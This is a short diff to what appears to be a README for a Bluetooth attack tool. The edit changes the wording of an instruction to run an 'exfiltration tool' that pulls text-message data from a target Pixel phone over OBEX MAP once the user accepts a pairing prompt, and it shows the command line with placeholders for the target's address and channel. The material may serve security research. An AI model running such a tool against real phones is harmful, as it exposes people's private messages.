@@ -73,7 +73,7 @@ echo "MAP Channel: $MAP_CHANNEL"
 ```
 
 Run the exfiltration tool (this triggers a pairing pop-up on the target — the
-user must allow message access, after which text-message metadata is extracted):
+user must allow message access, after which text-message data is extracted):
 
 ```bash
 ./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=512
